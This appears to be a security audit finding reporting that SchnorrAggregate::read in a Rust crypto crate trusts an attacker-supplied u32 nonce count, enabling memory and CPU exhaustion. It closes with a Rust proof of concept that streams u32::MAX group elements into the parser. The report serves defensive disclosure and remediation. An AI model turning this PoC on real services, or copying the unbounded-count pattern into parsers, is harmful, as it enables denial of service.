### Title
Unbounded aggregate nonce count enables memory exhaustion - ([File: crypto/schnorr/src/aggregate.rs](crypto/schnorr/src/aggregate.rs))

### Summary

`SchnorrAggregate::read` accepts a 32-bit count and deserializes that many group elements into an in-memory `Vec` without enforcing a protocol- or caller-defined maximum. An untrusted serialized aggregate can therefore force the host to consume memory and parsing time proportional to attacker-controlled input length. [1](#0-0) 

### Finding Description

The reader first accepts a little-endian `u32` named `len`. It then loops `0 .. len`, calling `C::read_G` for every declared nonce commitment and pushing each decoded point into `Rs`. [2](#0-1) 

There is no bound comparable to the transaction-count limit used elsewhere in the codebase, and the implementation does not reject an aggregate that exceeds the number of signatures supported by the consuming protocol. Afterward, `verify` requires `Rs.len() == keys_and_challenges.len()` and performs work proportional to that attacker-influenced length. [3](#0-2) 

### Impact Explanation

A caller that feeds attacker-controlled bytes to `SchnorrAggregate::read` can be forced to allocate and retain up to `u32::MAX` decoded group elements before any signature verification occurs. This can exhaust process memory or monopolize CPU while decoding and verifying an oversized aggregate. [4](#0-3) 

This is analogous to the referenced withdrawal issue because one attacker-supplied object determines the amount of work performed in a batch-processing routine, allowing expensive processing before the routine can reach a useful successful result.

### Likelihood Explanation

The vulnerable parser is public and accepts an arbitrary `io::Read` implementation. Any protocol exposing serialized aggregate Schnorr signatures to untrusted parties can be reached with public input bytes, without key access or validator privileges. [5](#0-4) 

### Recommendation

Enforce a maximum aggregate size before parsing. Preferably, pass the expected number of signatures into `SchnorrAggregate::read` and reject the input if the encoded count differs from that expected value. If no protocol-level maximum exists, impose an explicit conservative constant and reject larger counts before allocating or looping.

### Proof of Concept

```rust
use std::io::{self, Read};

use schnorr::aggregate::SchnorrAggregate;
use frost::curve::Secp256k1;
use ciphersuite::group::GroupEncoding;

struct AggregateBytes {
  header: io::Cursor<Vec<u8>>,
  generator: Vec<u8>,
  generated: u64,
  count: u64,
}

impl Read for AggregateBytes {
  fn read(&mut self, out: &mut [u8]) -> io::Result<usize> {
    let header_read = self.header.read(out)?;
    if header_read != 0 {
      return Ok(header_read);
    }

    if self.generated == self.count {
      return Ok(0);
    }

    let amount = out.len().min(self.generator.len());
    out[..amount].copy_from_slice(&self.generator[..amount]);
    if amount == self.generator.len() {
      self.generated += 1;
    }
    Ok(amount)
  }
}

let count = u32::MAX as u64;
let generator = <Secp256k1 as frost::curve::Ciphersuite>::G::generator()
  .to_bytes()
  .as_ref()
  .to_vec();

let mut attacker_input = AggregateBytes {
  header: io::Cursor::new((count as u32).to_le_bytes().to_vec()),
  generator,
  generated: 0,
  count,
};

// Repeatedly allocates attacker-controlled group elements until memory is exhausted.
let _ = SchnorrAggregate::<Secp256k1>::read(&mut attacker_input);
```

The vulnerability is the unconditional trust in the encoded count at `crypto/schnorr/src/aggregate.rs:78-84`; no successful signature is required to trigger the excessive allocation. [6](#0-5)
